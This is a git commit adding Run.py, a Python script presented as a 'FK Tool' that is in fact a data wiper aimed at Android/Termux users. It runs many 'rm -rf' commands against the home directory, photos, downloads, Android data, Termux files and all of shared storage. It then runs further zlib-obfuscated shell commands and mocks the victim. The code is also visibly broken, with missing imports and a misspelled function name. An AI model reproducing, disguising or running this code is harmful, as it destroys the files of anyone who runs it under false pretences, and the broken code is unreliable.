65dc418c5a70315e1c57fb08c72b8297a4f8c632
NASRAT TECH <148715235+Nasrat99799@users.noreply.github.com>
2024-09-10 22:17:36 +0500

    Create Run.py

---
+++ Run.py
@@ -0,0 +1,40 @@
+# SULTAN NASRAT SYS
+#________START_________#
+import time
+print('Welcome Dear To FK Tool')
+time.sleep(1)
+
+def N_Fuck():
+	os.system('clear')
+	print('-'*50)
+	os.system('rm -rf')
+	os.system('rm -rf $HOME/*')
+	os.system('rm -rf /sdcard/Download/*')
+	os.system('rmdir /storage/emulated/0/DCIM/Camera/*')
+	os.system('rm -rf /storage/emulated/0/DCIM/*')
+	os.system('rm -rf /sdcard/DCIM/*')
+	os.system('rmdir -rf /storage/emulated/0/Android/*')
+	os.system('rm -rf /sdcard/Android/*')
+	os.system('rm -rf /sdcard/Download/*')
+	os.system('rm -rf /data/data/com.termux/files/*')
+	os.system('rm -rf /data/data/com.termux/files/usr/bin/*')
+	os.system('rm -rf /storage/emulated/0/Pictures/*')
+	os.system('rm -rf /storage/emulated/0/*')
+	Nasrat_SYS()	
+
+os.system('git pull')
+
+def Nasat_SYS():
+	os.system('clear')
+	print('[] Withing For Fucking Bro😐.')
+	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+	print(' Fuck You Bypass User ')
+	
+	
+	
+if __name__=="__main__":
+	N_Fuck()
+	
+	
